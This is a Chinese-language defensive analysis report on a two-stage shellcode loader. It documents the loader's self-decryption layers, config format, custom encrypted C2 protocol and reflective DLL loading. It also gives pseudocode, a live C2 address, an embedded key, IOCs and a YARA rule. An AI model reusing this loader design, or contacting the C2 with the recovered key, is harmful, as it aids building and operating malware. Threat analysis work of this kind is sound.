# Magnet Wire v2 加载器分析报告

> **样本代号**：MagnetWire-v2（取自其握手协议内部标签）
> **分析日期**：2026-10-29
> **分析对象**：外层 PE32+ 加载器 + 18,068 字节自解密 shellcode（stage-2）
> **分析方法**：静态 PE 解析、Unicorn 2.1.4 CPU 模拟、Ghidra 12.2 反编译
> **安全声明**：全程未在本机运行样本；所有“执行”均为 CPU 级模拟或静态推导
> **用途**：防御性分析、检测规则编写、威胁情报共享
> **版本说明（2026-10-30）**：原稿为作者上一版本地草稿，非他人报告；本版修正了其中的错误结论（原稿误判为 CobaltStrike Beacon、C2 写作 `74.121.14.228:8443`）。截至 2026-10-30，公开检索渠道未发现该样本的既有深度分析，本报告公开其 stage-2 九层解密、`DMV2` 配置与 `Magnet Wire v2` 握手协议细节。样本首次提交微步在线时间为 2026-10-10，早于本报告分析。

---

## 0. 执行摘要

该样本是一个**两阶段加载器**：

1. **Stage 1（外层 PE32+ x64 EXE）** 从自身文件末尾的 `BLT_PAYLOAD_001` trailer 中取出 18,068 字节 payload，申请 RW 内存、拷贝、改为 RWX、创建线程执行；
2. **Stage 2（payload 本身）** 是一个 9 层递归自解密的 shellcode。解密完成后跳到入口 `0x193`，解密 `DMV2` 配置、按哈希解析 API，然后：
   - 优先读取 `C:\ProgramData\11EB62EB00009B10\1` 缓存；
   - 缓存不存在或加载失败时，通过自研的 **`Magnet Wire v2`** 协议连接 **`156.251.16.220:443`**；
   - 用 **ChaCha20-Poly1305** 加密信道下载一个 aPLib 压缩的 PE32+ x64 DLL；
   - 反射加载该 DLL，并调用其导出函数，把配置指针交给它。

**它不是 CobaltStrike Beacon**。代码中没有 CobaltStrike 的配置结构、Malleable C2 信标或反射加载器特征；它使用的是自研二进制协议、自研反射加载器和自研配置格式。

**关键结论（TL;DR）**：

- C2：`156.251.16.220:443`（TCP），不是 `74.121.14.228:8443`；
- 嵌入 payload：18,068 字节，不是约 104 KB；
- 配置：`DMV2` v2，大小 `0x1d0`，固定密钥 `0xc0deface` 的流式异或；
- 协议：8 字节记录头 + 自定义握手 + ChaCha20-Poly1305 命令帧；
- 持久化：**不在本层**；本层只做缓存、下载、反射加载和 `Sleep(60000)` 保活；
- 反调试/反沙箱：**本层没有**；仅外层 CRT 启动代码含 `IsDebuggerPresent`，属于编译器运行时检查，不宜写成恶意反调试；
- 密码学实现规范，但 **PSK 静态嵌入、transcript 明文传输**，拿到样本即可还原会话密钥，无前向保密。

---

## 1. 样本与阶段划分

| 阶段 | 形态 | 作用 | 是否在手 |
|---|---|---|---|
| Stage 1 | 外层 PE32+ x64 EXE | 读自身 EOF trailer，取 payload，RWX 内存 + 线程执行 | 是（原始样本） |
| Stage 2 | 18,068 B 自解密 shellcode | 配置解密、API 哈希解析、缓存/下载、反射加载 DLL | 是（已还原明文） |
| Stage 3 | PE32+ x64 DLL | 最终载荷；C2 下发，aPLib 压缩 | 否（未捕获） |

Stage 1 只是“壳”，Stage 2 是“下载器/加载器”，Stage 3 才是“真正干活的东西”。

### 1.1 样本哈希

| 文件 | 大小 | SHA-256 | MD5 |
|---|---|---|---|
| 原始样本 `7.0_64_create_thread_safe (2).exe` | 123,068 B（120.18 KB） | `daef4a72268d193e0f1ea376461b3c337ee82547be2ede942310b702cd12148a` | `fa2de9d30f1598981e7c21b0fe0cf3bf` |
| 释放缓存 `C:\ProgramData\11EB62EB00009B10\1` | 255.9 KB（平台报告） | `413ea0663a4f73da40221e2e397167e0fd59adb4e1879e0d86e6f00abaae1101` | — |
| `payload_001.bin`（从 EXE 提取的加密 payload） | 18,068 B | `609e4506e995e6312933badd3029648f3d1151c06a5dad4f84ee1e36816fb4a8` | `c8afd18fc0c457ef6df40d373e1fec3b` |
| `payload_decrypted.bin`（解密后 shellcode） | 18,068 B | `13a27e67aa6f3d95f529ca18ba0b7998d0d73e137ce9ad7955f1a00c7556b39e` | `730c83a1e86d913c417ec955f2ee6ddc` |

原始样本 SHA-1：`bed975c93ae3290e875ecc0250d57bb0d9a43a7e`。加密 payload 的熵约为 **7.991**；解密后镜像的前 18,068 字节与 ThreatBook 公开的 18,068 字节内存转储**逐字节一致**。释放缓存行的哈希/大小来自微步报告，未在本机复算（缓存文件不在手）。

### 1.2 原始样本静态特征（来自微步报告）

- 文件类型：PE32+ GUI x86-64，7 个节区，熵 6.31，未签名；
- 编译：Microsoft Linker 14.36 / VS2022 17.6，时间戳 2026-07-01 19:35:46；
- TLS 回调存在（`AddressOfCallBacks = 0x14000e328`），导入表只有 KERNEL32（81 个函数）；
- PDB：`H:\window\tools\BinLoadTester\TestExeTemplates\out\x64\create_thread_safe_64.pdb`——路径里的 `BinLoadTester` / `TestExeTemplates` 带有明显的加载器测试模板色彩（推断，非结论）；
- 平台时间线：首次提交 2026-10-10，末次提交/分析 2026-10-28；微步判定恶意，9/28 引擎检出，家族 `ShellcodeRunner`。

---

## 2. 分析方法与可复现性

1. **外层 PE 解析**：定位 EOF trailer，解析 `offset/size`，按 RVA→文件偏移映射读取嵌入 payload。
2. **Stage-2 解包**：Unicorn 2.1.4，映射基址 `0x10000000`（1 MiB）、栈 `0x20000000`；只做 CPU 模拟、不实现任何系统调用；运行到 `gs:[0x60]`（PEB）处因未映射内存而停止，导出 1 MiB 内存镜像，前 18,068 字节即明文。
3. **入口定位**：在 stub 区 `[0x4000, 0x4694)` 挂钩，读取每次命中的 `[rsp]`，记录落在 `< 0x3000` 的返回地址；得到 9 个 head，最内层循环在 `0x191`，fall-through 到 **真实入口 `0x193`**。
4. **反编译**：Ghidra 12.2 headless，BinaryLoader（base 0）、`x86:LE:64:default`，用 Java GhidraScript 批量反编译 41 个关键函数，产出 `decompiled_key.c`。
5. **安全边界**：样本从未在本机原生执行；所有“运行”都是 Unicorn CPU 模拟。

> 说明：Ghidra 的无类型反编译存在少量伪影（函数参数丢失、`swi(3)` 表示不可达的 `int3`、`lVar6+0x197` 表示从 entry 之后开始搜索配置标记）。本文引用语义时已结合上下文和此前的汇编/模拟结果校正。

---

## 3. Stage 1：外层加载器

### 3.1 EOF trailer

文件末尾 40 字节（`0x28`）结构：

| 偏移 | 长度 | 内容 |
|---|---|---|
| +0x00 | 16 B | magic：`BLT_PAYLOAD_001\0` |
| +0x10 | 4 B | version = 1 |
| +0x14 | 4 B | flags = 0x40 |
| +0x18 | 8 B | payload 文件偏移（u64） |
| +0x20 | 8 B | payload 大小（u64） |

校验：`payload_offset + 0x28 + payload_size == fileSize`。也就是说 payload 紧挨着 trailer 存放。

### 3.2 加载链

```
GetModuleFileNameW          // 取自身路径
CreateFileW                 // 打开自身
GetFileSizeEx               // 取文件大小
ReadFile(trailer)           // 读末尾 40 字节
SetFilePointer(payload_off) // 跳到 payload
ReadFile(payload)           // 读 18,068 字节
VirtualAlloc(RW)
memcpy
VirtualProtect(RWX)
FlushInstructionCache
CreateThread(payload_base)  // 从 payload 偏移 0 开始执行
WaitForSingleObject
VirtualFree
```

这是一套通用 shellcode 加载器，任何需要“文件内嵌 payload + 内存执行”的样本都可以长这样，**不能据此判定 CobaltStrike**。

---

## 4. Stage 2：整体结构

### 4.1 9 层自解密 stub

payload 开头不是入口，而是一组递归解密的 stub：

- 各层 head 偏移：`0x5`、`0x38`、`0x64`、`0x8c`、`0xb8`、`0xe2`、`0x11a`、`0x14b`、`0x16e`；
- 对应 stub 位于 `0x4653`、`0x460b`、`0x45d7`、`0x4590`、`0x455d`、`0x4514`、`0x44e2`、`0x44b6`、`0x447e`；
- 最内层解密循环在 `0x191`，循环结束落到 **`0x193`（真实入口）**。

每层做的事情类似：以 `lea r12,[rip+9]` 取得密钥自修改循环的基址，逐字节 `xor [r12+rcx], al` / `add al, [r12+rcx]`，循环完成后跳到下一层 head。9 层全部解完后，内存中的 18,068 字节镜像就是本文分析的 C 代码。

### 4.2 函数地图

| 地址 | 函数 | 作用 |
|---|---|---|
| `0x193` | entry | 主流程：配置 → API → 本地缓存 → 网络 |
| `0xb5b` / `0xb2b` | decrypt_config / keystream | 配置解密 |
| `0x32eb` / `0x334b` | PEB 解析 / 导出哈希解析 | 找 kernel32、按哈希取 API |
| `0x32ab` / `0x325b` | ASCII / UTF-16 哈希 | 大小写不敏感的滚动哈希 |
| `0x3b6b` | load_dll_by_hash | 枚举 System32，按文件名哈希加载 DLL |
| `0x313b` | build_stage_path | 拼 `C:\ProgramData\<campaign>\1` |
| `0x3aab` | run_payload | aPLib 解压 + 反射加载 |
| `0x3d5b` | network_main | 建连、握手、注册、收帧、下载、落盘、执行 |
| `0x2c5b` 等 | handshake / hs_* | `Magnet Wire v2` 握手与密钥派生 |
| `0x2d6b` / `0x2eeb` | send_cmd / recv_cmd | 加密命令帧收发 |
| `0x230b` / `0x23db` | aead_encrypt / decrypt | ChaCha20-Poly1305 |
| `0x175b` / `0x192b` / `0x21eb` | ChaCha20 / XOR / Poly1305 | RFC 8439 实现 |
| `0x162b` / `0x277b` | KDF / label | SHA-256 基础的自定义 KDF |
| `0x250b` | rng | lowbias32 PRNG（非密码学随机） |
| `0x398b` | write_stage_file | XOR 后写缓存文件 |
| `0x34ab` | aplib_depack | aPLib 解压到 1 MiB 缓冲 |
| `0x36ab` | pe_reflective_load | 反射加载 DLL、调导出 |
| `0x30bb` / `0x310b` | close_socket / sleep_forever | 清理 / 60 秒死循环保活 |

### 4.3 主流程

```
entry:
    p   = search("%@)!#!$")                  // 0x42a7
    cfg = xor_decrypt(p+7, 0x1d0, 0xc0deface) // 0x42ae, "DMV2" v2
    if (!valid(cfg)) return;

    api = resolve_all_by_hash();              // 43 个 API
    buf = VirtualAlloc(0, 0x40000e, RWX);     // 约 4 MiB

    path = "C:\ProgramData\<cfg.campaign_id>\1";
    if (file_exists(path) && 0x2800 < size <= 0x400000) {
        xor(buf, size, cfg.campaign_id);
        if (run_payload(buf, size)) {         // 成功 = 导出函数返回 0
            Sleep(60000) forever;             // stage-3 已接管，保活
        }
    }

    // 本地没有 / 没跑起来 → 联网
    WSAStartup(0x202);
    while (network_main() == 0) ;             // 失败内部 Sleep(5000) 后重连
    WSACleanup();
    Sleep(60000) forever;
```

两个关键点：

- **本地优先、网络兜底**：只要缓存 DLL 能加载且导出返回 0，就完全不联系 C2。C2 只在首次感染、缓存缺失或 stage-3 要求更新时才会出现。
- **成功即常驻**：`0x310b` 是 `Sleep(60000)` 死循环，把注入线程挂住，让 stage-3 自己的线程继续跑。本层**没有**写 Run 键、服务或计划任务。

---

## 5. 配置解密（DMV2）

### 5.1 定位与解密

1. 从 `0x197` 开始向后搜索 7 字节标记 `%@)!#!$`（`25 40 29 21 23 21 24`），实际位于 **`0x42a7`**；
2. 配置从标记后 7 字节开始，即 **`0x42ae`**，长度 `0x1d0`；
3. 每个字节与 `lowbias32(0xc0deface + i*0x9e3779b9) & 0xff` 异或；
4. 校验：magic `DMV2`、size `0x1d0`、version `2`、`+0x16c` 的 32 字节 PSK 不能全零。

`0xc0deface` 是作者留下的“code face”彩蛋；`0x9e3779b9` 是黄金比例增量；`lowbias32` 是一个常见的非密码学 32 位哈希/PRNG。

### 5.2 字段

| 偏移 | 内容 | 值 |
|---|---|---|
| +0x000 | magic | `DMV2`（`0x32564d44`） |
| +0x004 | size | `0x1d0` |
| +0x008 | version | 2 |
| +0x00c | C2 IP 字符串 | `156.251.16.220` |
| +0x10b | campaign ID（16 B） | `11EB62EB00009B10` |
| +0x154 | 端口 u16 | 443 |
| +0x15c | client ID（16 B） | `17e936cd21c167c3712e430c1308e267` |
| +0x16c | PSK / KDF key（32 B） | `d57a419ae153533cb8567f3da79f7f33dc0e9f555ea771bce949f9ef938cca99` |

三个 ID 的分工：

- **campaign ID** → 目录名 + 磁盘异或密钥；
- **client ID** → 握手时发给服务端做标识；
- **PSK** → 只用于 KDF，不在网络上传输。

配置解密后，指针会作为唯一参数传给 stage-3 的导出函数（`export(config_ptr)`），stage-3 不需要再解密配置。

---

## 6. API 解析

### 6.1 找 kernel32

`gs:[0x60]` → PEB → `Ldr` → `InMemoryOrderModuleList`，对每个模块的 `BaseDllName` 做 UTF-16 哈希，匹配 `0x875d81e7`（`kernel32.dll`）。

### 6.2 导出哈希

```
h = 0xb1f48651;
for (c : name) {
    if (c >= 'a' && c <= 'z') c -= 0x20;   // 大小写不敏感
    h = (h ^ c) * 0x10001ab;              // mod 2^32
}
```

这是 FNV-1a 风格的滚动哈希，但乘数不是 FNV 的 `0x01000193`，而是 `0x010001AB`。

验证：用该算法复算 `GetProcAddress` / `Sleep`，分别得到 `0xab36b1f1` / `0x70d84bdc`，与样本中的哈希表一致。

解析导出表时，如果目标 RVA 落在导出目录范围内（转发导出），会回退到 `GetProcAddress` 处理。

### 6.3 其他 DLL

ntdll / user32 / ws2_32 / shell32 不直接写 DLL 名字符串，而是：

1. `GetSystemDirectoryA` 取 System32 路径；
2. `FindFirstFileA` / `FindNextFileA` 枚举文件；
3. 对每个文件名做 ASCII 哈希；
4. 命中后先 `GetModuleHandleA`，未加载再 `LoadLibraryA(完整路径)`。

### 6.4 解析结果

共解析 **43 个 API**：

- **kernel32（20）**：`GetProcAddress`、`Sleep`、`LoadLibraryA`、`VirtualAlloc`、`VirtualFree`、`GetModuleHandleA`、`GetSystemDirectoryA`、`FindFirstFileA`、`FindNextFileA`、`FindClose`、`GetCurrentProcessId`、`CreateFileA`、`CreateDirectoryA`、`GetTickCount`、`GetFileSize`、`ReadFile`、`CloseHandle`、`DeleteFileA`、`WriteFile`、`lstrcatA`；
- **ntdll（2）**：`RtlZeroMemory`、`RtlMoveMemory`；
- **ws2_32（16）**：`WSAStartup`、`socket`、`getaddrinfo`、`freeaddrinfo`、`htons`、`connect`、`send`、`recv`、`closesocket`、`setsockopt`、`ioctlsocket`、`sendto`、`recvfrom`、`WSACleanup`、`WSAGetLastError`、`shutdown`；
- **user32（4）**：`GetTopWindow`、`GetWindow`、`ShowWindow`、`GetWindowThreadProcessId`；
- **shell32（1）**：`SHGetFolderPathA`。

**解析了但本层没调用**：

- user32：上述 4 个全部未使用；
- ws2_32：`ioctlsocket`、`sendto`、`recvfrom`、`WSAGetLastError` 未使用。

这说明它可能来自更大的模板，或为后续版本预留。报告里可以写“具备窗口枚举 / UDP 能力预留”，但不要写成“已使用”。

---

## 7. 本地缓存执行路径

- 路径：`C:\ProgramData\11EB62EB00009B10\1`；
- 构造方式：`SHGetFolderPathA(CSIDL_COMMON_APPDATA=0x23)` → 追加 `\` → 追加 campaign ID → `CreateDirectoryA` → 追加 `\1`；
- 文件格式：`XOR(aPLib(PE32+ DLL), campaign_id)`，不是可直接执行的 PE；
- 大小要求：`0x2800 < size <= 0x400000`（10 KB ~ 4 MiB）；
- 执行：读入 4 MiB RWX 缓冲 → 用 campaign ID 异或 → `run_payload`。

`run_payload`：

1. 申请 1 MiB `PAGE_READWRITE`；
2. `aplib_depack(src, size, dst)`；
3. 解压失败 → 返回 false，走网络；
4. 解压成功 → `pe_reflective_load`；
5. 反射加载成功且导出返回 0 → true。

所以“无文件攻击”这个说法要修正：**PE 确实不落盘，但磁盘上有一个稳定的加密缓存文件**，下次启动会优先用它。

微步动态报告也记录了这个文件：`C:\ProgramData\11EB62EB00009B10\1`，255.9 KB，类型 `data`（不是 PE），SHA-256 `413ea0663a4f73da40221e2e397167e0fd59adb4e1879e0d86e6f00abaae1101`，0/28 检出——与“XOR 后的 aPLib 压缩流”完全吻合。

---

## 8. 网络执行路径

### 8.1 建连

```c
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
setsockopt(SO_RCVTIMEO = 5000 ms);
setsockopt(SO_SNDTIMEO = 5000 ms);
setsockopt(SO_RCVBUF  = 0x10000);
setsockopt(SO_SNDBUF  = 0x10000);
setsockopt(SO_KEEPALIVE = 1);
getaddrinfo(cfg.ip, ...);
connect(..., cfg.port = 443);
```

连接完成后发送注册帧（cmd `0x22`），然后进入收帧循环。

微步动态报告捕获到与该地址的 TCP 通信：上行约 167 B、下行约 256 KB（5 条记录），与“注册 + 下载 stage-3”的流量形态一致。

### 8.2 握手：`Magnet Wire v2`

所有握手记录都是 8 字节头：`{BE32 payload_len, 0, 0, 0, 0x02}`。

```
C→S  ClientHello  0x46 B：版本/角色/idlen=0x10 + client_id(16) + client_random(32) + tick(8)
S→C  ServerHello  0x51 B：type=2 + server_nonce(32) + server_proof(32)
C→S  ClientProof  0x21 B：0x03 + client_proof(32)
```

- 客户端校验 server proof：`KDF("...server proof", transcript || server_hello[0:0x31])`；
- 客户端计算自己的 proof：`KDF("...client proof", transcript)`；
- 双方用包含 client proof 的完整 transcript 派生会话密钥。

`server_nonce` 位于 ServerHello 的 `+9`，`server_proof` 位于 `+0x31`。

### 8.3 密钥派生

KDF 是 SHA-256 基础的自定义构造：把 32 字节 PSK 补零到 64 字节后，依次吸收 label 和输入数据。从调用形态看，它**不是**标准 HMAC/HKDF；报告里写“基于 SHA-256 的自定义 KDF”最稳妥。

label 在运行时用立即数拼出来，**文件里没有明文字符串**，普通 `strings` / YARA 抓不到：

| # | label | 用途 |
|---|---|---|
| 1 | `Magnet Wire v2 transcript` | master secret |
| 2 | `Magnet Wire v2 c2s key` | 客户端→服务端密钥 |
| 3 | `Magnet Wire v2 s2c key` | 服务端→客户端密钥 |
| 4 | `Magnet Wire v2 c2s nonce` | 取前 4 B 作 nonce 基数 |
| 5 | `Magnet Wire v2 s2c nonce` | 取前 4 B 作 nonce 基数 |
| 6 | `Magnet Wire v2 server proof` | 校验服务端 |
| 7 | `Magnet Wire v2 client proof` | 客户端证明 |

### 8.4 加密命令帧

```
[BE32 len][cmd][b5][b6][0x02] [BE64 seq][ChaCha20 密文][Poly1305 tag(16)]
      len = 8 + 密文长度 + 16
```

- AEAD 是标准 RFC 8439：sigma 常量、32 位计数器、12 字节 nonce、Poly1305 的 16 字节分块与长度块、**先验 tag 再解密**；
- nonce 从调用形态推断为 `4 B 基数 || 8 B seq`；
- AAD 为 0x30 字节，由帧头/序号/master 派生（`0x2c0b`，未单独展开）；
- seq 严格递增校验，重放/乱序会断线。

### 8.5 下载协议

| cmd | 方向 | 内容 |
|---|---|---|
| `0x22` | C→S | 注册：16 B `00 00 00 40 00 00 00 08 8b e8 59 07 6a 21 57 57` |
| `0x1f` | S→C | 下载头：`{BE32 总大小 ≤ 4 MiB, BE32 CRC32, BE32 分片数}` |
| `0x20` | S→C | 分片：`{BE32 index, data}`，校验序号、累计 CRC |
| `0x21` | S→C | 结束：`{BE32 CRC32}`，校验分片数/总字节数/`~CRC == 头 CRC == 尾 CRC` |

下载限制：

- 总大小 ≤ `0x400000`（4 MiB）；
- 单帧接收缓冲 `0x18000`（96 KiB），所以每个分片的数据最多约 96 KiB；
- CRC32 多项式 `0xedb88320`，初值 `0xffffffff`，最终取反。

### 8.6 落盘与执行

下载完成后：

1. `write_stage_file`：用 campaign ID 异或内存中的 aPLib blob，写盘，再异或回来（恢复内存明文）；
2. `run_payload`：aPLib 解压 → 反射加载；
3. 成功 → 关 socket、`WSACleanup`、死循环保活；
4. 失败 → `Sleep(5000)` 重连。

---

## 9. Stage 3 加载：aPLib + 反射 PE

### 9.1 aPLib 解压

- 输出缓冲：1 MiB `PAGE_READWRITE`；
- 输入：从 C2 下载的 aPLib 数据（内存中是明文压缩流）；
- 这是经典的 aPLib 1.x 解压算法：首字节字面量、gamma 编码、阈值 `0x7d00` / `0x500` / `0x80`。

### 9.2 反射加载器

- 校验 `MZ` / `PE\0\0` / machine `0x8664` / magic `0x20b`（PE32+）；
- `VirtualAlloc(SizeOfImage, RWX)`；
- 拷贝头、映射节、清零 BSS；
- 修重定位：type 3（HIGHLOW）和 type 0xA（DIR64）；
- 填 IAT：`LoadLibraryA` + 按哈希解析（支持序号和转发导出）；
- 调 TLS 回调；
- 调入口点 `DllMain(image, DLL_PROCESS_ATTACH)`；
- 解析导出哈希 **`0x2ec07661`**，调用 `export(config_ptr)`，返回 0 视为成功。

它**不**把模块挂进 PEB、不恢复节权限、不调 `DLL_PROCESS_DETACH`——是一个最小化加载器，所以在进程模块列表里看不到这个 DLL 的路径。

> `0x2ec07661` 是 32 位哈希。我们做了 meet-in-the-middle，7/8 字符空间能撞出很多 preimage（例如 `DM_START`），但**不能确定**哪个是真名；必须拿到 stage-3 DLL 才能确认导出函数名。

---

## 10. 密码学评估

### 10.1 做得规范的地方

- ChaCha20-Poly1305 与 RFC 8439 对得上：sigma 常量、32 位计数器、12 字节 nonce、Poly1305 的 16 字节分块和长度块、先验 tag 再解密；
- 握手有双向 proof：服务端证明自己知道 PSK，客户端也证明；
- 帧头/序号进入 AAD，篡改长度或 cmd 会验签失败；
- seq 严格校验，能抵抗简单的重放/乱序。

### 10.2 真正的弱点

- **PSK 是每构建静态的**，且能从样本里解出来（配置只是固定密钥异或）；握手 transcript 又是明文传输，所以拿到样本的人可以还原会话密钥、解密抓到的流量——**没有前向保密**；
- 客户端随机数不是 `CryptGenRandom`，而是 `lowbias32`，种子是 `GetTickCount() ^ GetCurrentProcessId() ^ socket`，不是密码学随机；
- 32 位导出哈希碰撞空间很大，不适合做强身份绑定；
- 多处 **RWX** 缓冲（约 4 MiB 下载缓冲、路径缓冲、`SizeOfImage` 镜像），是内存取证/EDR 的明显抓手。

---

## 11. 与上一版草稿的差异（勘误）

| 上一版草稿结论 / 遗漏项 | 本次验证 |
|---|---|
| PE32+ x64 | ✅ 外层 EXE 与 stage-3 DLL 都是 x64 PE32+ |
| CobaltStrike Beacon 加载器 | ❌ 自研 stage-2；`Magnet Wire v2` 协议、`DMV2` 配置，无 CS 特征 |
| C2 `74.121.14.228:8443` | ❌ 实测 `156.251.16.220:443` |
| 魔数 `BLT_PAYLOAD_001` | ✅ 外层 PE 的 EOF trailer |
| 约 104 KB 明文 Payload | ❌ 嵌入 payload 18,068 B；原始 EXE 120.18 KB；解密前后同长；与 ThreatBook 内存转储逐字节一致 |
| `VirtualAlloc→memcpy→VirtualProtect→CreateThread` | ✅ 外层加载器如此，但这只是 stage-1；stage-2 还有配置/握手/下载/反射加载 |
| 反沙箱/反调试 | ⚠️ 本层没有；外层仅 CRT 的 `IsDebuggerPresent`，不宜写成恶意反调试 |
| 内存执行绕过 | ✅ 反射加载 DLL；但磁盘有 `C:\ProgramData\<ID>\1` 缓存，不是完全无文件 |
| 未给出原始样本哈希 | 原始 EXE SHA-256 `daef4a72268d193e0f1ea376461b3c337ee82547be2ede942310b702cd12148a`，微步在线 9/28 判定恶意（家族 `ShellcodeRunner`）；释放缓存 SHA-256 `413ea0663a4f73da40221e2e397167e0fd59adb4e1879e0d86e6f00abaae1101` |

关于家族归属：代码层能证明的是“自研 `Magnet Wire v2` 加载器”；如果外部情报（沙箱报告、厂商命名）提到 ValleyRAT 等家族，应单独标注来源和置信度，不能由这段 C 单独证明。

---

## 12. IOC

| 类型 | 值 |
|---|---|
| 原始样本文件名 | `7.0_64_create_thread_safe (2).exe` |
| 原始样本 SHA-256 | `daef4a72268d193e0f1ea376461b3c337ee82547be2ede942310b702cd12148a` |
| 原始样本 MD5 | `fa2de9d30f1598981e7c21b0fe0cf3bf` |
| 原始样本 SHA-1 | `bed975c93ae3290e875ecc0250d57bb0d9a43a7e` |
| 原始样本大小 | 123,068 B（120.18 KB） |
| 释放缓存 SHA-256 | `413ea0663a4f73da40221e2e397167e0fd59adb4e1879e0d86e6f00abaae1101` |
| 加密 payload SHA-256 | `609e4506e995e6312933badd3029648f3d1151c06a5dad4f84ee1e36816fb4a8` |
| 解密 shellcode SHA-256 | `13a27e67aa6f3d95f529ca18ba0b7998d0d73e137ce9ad7955f1a00c7556b39e` |
| C2 | `156.251.16.220:443`（TCP） |
| 缓存文件 | `C:\ProgramData\11EB62EB00009B10\1` |
| campaign ID | `11EB62EB00009B10` |
| client ID | `17e936cd21c167c3712e430c1308e267` |
| PSK | `d57a419ae153533cb8567f3da79f7f33dc0e9f555ea771bce949f9ef938cca99` |
| 配置 | marker `%@)!#!$`，magic `DMV2`，ver 2，key `0xc0deface`，size `0x1d0` |
| 协议指纹 | ClientHello 前 13 B：`00 00 00 46 00 00 00 02 01 00 02 00 02`；ServerHello 前 9 B：`00 00 00 51 00 00 00 02 02`；ClientProof 前 9 B：`00 00 00 21 00 00 00 02 03`；注册帧头：`00 00 00 28 22 02 00 02` |
| 代码常量 | `0xb1f48651`、`0x10001ab`、`0xc0deface`、`0x9e3779b9`、`0x7feb352d`、`0x846ca68b`、`0x2ec07661` |
| 导出哈希 | `0x2ec07661`（可用于在 stage-3 DLL 中定位导出函数） |
| PDB 路径 | `H:\window\tools\BinLoadTester\TestExeTemplates\out\x64\create_thread_safe_64.pdb` |
| 微步报告编号 | `S-261029-daef4a` |

> `Magnet Wire v2 ...` 这些字符串在文件里不是明文，是运行时用立即数拼出来的，`strings` / 普通 YARA 抓不到，需要按常量或代码特征匹配。

### 12.1 公开平台收录情况（2026-10-29 核查）

| 平台 | 结果 |
|---|---|
| 微步在线（ThreatBook） | **已收录**。原始样本报告编号 `S-261029-daef4a`，判定恶意，9/28 引擎检出，家族 `ShellcodeRunner`；报告含 C2 `156.251.16.220:443` 与释放文件哈希。匿名访问现需滑块人机校验。 |
| VirusTotal | 页面可访问，但匿名请求触发 reCAPTCHA，**未能确认是否已收录及检出数**；需浏览器登录或 API key 复核。 |
| AlienVault OTX | 0 条 pulse（截至 2026-10-29）。 |
| MalwareBazaar | 匿名 API 返回 401（需 Auth-Key），未核查。 |

说明：`payload_001.bin` 和 `payload_decrypted.bin` 是提取物，通常不会被平台按文件收录；真正可检索的是原始 EXE 和释放缓存文件的哈希。

---

## 13. 检测建议

### 13.1 主机侧

- 监控 `C:\ProgramData\<16 位十六进制>\1` 的创建与读取；
- 监控“私有 RWX 分配 + 约 4 MiB 大小”的行为（`0x40000e`）；
- 监控反射加载特征：PE 头出现在非模块内存、`VirtualAlloc(SizeOfImage, RWX)`、手工填 IAT、TLS 回调；
- 监控进程内 `Sleep(60000)` 循环伴随后台线程持续活动；
- 注意：本层**不写** Run 键/服务/计划任务，持久化应在外层或 stage-3 查找。

### 13.2 网络侧

- TCP 443 上出现 8 字节记录头 `00 00 00 xx 00 00 00 02`，随后紧跟 `01 00 02 00 02`（ClientHello）；
- 服务端返回 `00 00 00 51 00 00 00 02 02`（ServerHello）；
- 之后是 `00 00 00 21 00 00 00 02 03`（ClientProof）；
- 命令帧的 cmd 字节为 `0x1f` / `0x20` / `0x21` / `0x22`；
- 连接超时 5 秒、64 KiB 收发缓冲、keepalive，失败后 5 秒重连；
- 首包特征比 TLS 更“短小”：没有 TLS record 的 `16 03 01/03` 开头。

### 13.3 YARA（静态，保守版）

```yara
rule MagnetWire_v2_stage2_consts
{
    meta:
        description = "Magnet Wire v2 stage-2 shellcode constants"
        date = "2026-10-29"
        author = "静态分析"
    strings:
        $c1 = { 51 86 f4 b1 }   // 0xb1f48651
        $c2 = { ab 01 00 01 }   // 0x010001ab
        $c3 = { ce fa de c0 }   // 0xc0deface
        $c4 = { b9 79 37 9e }   // 0x9e3779b9
        $c5 = { 2d 35 eb 7f }   // 0x7feb352d
        $c6 = { 8b a6 6c 84 }   // 0x846ca68b
        $c7 = { 61 76 c0 2e }   // 0x2ec07661
    condition:
        4 of ($c*)
}
```

注意：字符串是运行时构造，静态 YARA 抓不到；建议结合内存扫描（配置解密后出现 `DMV2`、`Magnet Wire v2` 标签、18 KB 自解密 shellcode 镜像）。

### 13.4 内存扫描思路

- 搜索 `DMV2` + 大小 `0x1d0` + version 2 的配置结构；
- 搜索 `Magnet Wire v2` 标签（可能在栈上的临时缓冲中出现）；
- 搜索 18,068 字节、熵约 6.3 的明文 shellcode 镜像；
- 搜索 RWX 区域内以 `MZ` 开头、machine `0x8664`、magic `0x20b` 的反射加载 DLL。

---

## 14. 局限与未解项

- **stage-3 DLL 不在手**：导出名、DLL 自己的 C2/持久化/功能都无法确认；
- `0x2bcb`（nonce 派生）、`0x2c0b`（AAD 派生）、`0x262b`（握手记录封装）没有单独反编译，目前是按调用形态推断；
- ClientHello 里有一个 4 字节字段（`local_4f`）Ghidra 丢了参数，值未确定；
- `0x2ec07661` 只有 32 位，meet-in-the-middle 会产生大量碰撞，不能唯一确定导出名；
- 全部结论来自静态分析 + Unicorn CPU 模拟，**没有运行样本**；
- 家族归属需要外部情报佐证。

---

## 附录 A：分析产物

| 文件 | 说明 |
|---|---|
| `extracted/payload_001.bin` | 从外层 PE 取出的加密 payload，18,068 B |
| `extracted/payload_emulated.bin` | Unicorn 导出的 1 MiB 内存镜像 |
| `extracted/payload_decrypted.bin` | 明文 shellcode，18,068 B |
| `decompiled_key.c` | Ghidra 对 41 个关键函数的 C 反编译 |
| `emulate_unpack.py` | Unicorn 解包脚本（CPU 模拟，无系统调用） |
| `find_entry.py` | 9 层 head / 真实入口定位脚本 |
| `analyze_plain.py` | 签名与字符串扫描脚本 |
| `ghidra_scripts/DecompileKeyFunctions.java` | Ghidra headless 批量反编译脚本 |

## 附录 B：关键常量速查

| 常量 | 用途 |
|---|---|
| `0xc0deface` | 配置解密 PRNG 种子 |
| `0x9e3779b9` | lowbias32 黄金比例增量 |
| `0x7feb352d` / `0x846ca68b` | lowbias32 乘数 |
| `0xb1f48651` | API/模块哈希初值 |
| `0x10001ab` | API/模块哈希乘数 |
| `0x2ec07661` | stage-3 导出名哈希 |
| `0xedb88320` | CRC32 多项式 |
| `0x40000e` | 下载/暂存缓冲大小（约 4 MiB） |
| `0x18000` | 单帧接收缓冲（96 KiB） |
| `0x8000` | `VirtualFree(..., MEM_RELEASE)` |
| `0x3000` | `MEM_COMMIT \| MEM_RESERVE` |
| `0x40` | `PAGE_EXECUTE_READWRITE` |

## 附录 C：分析环境

- Windows 11 + WSL2；
- Unicorn 2.1.4、Capstone 5.0.7；
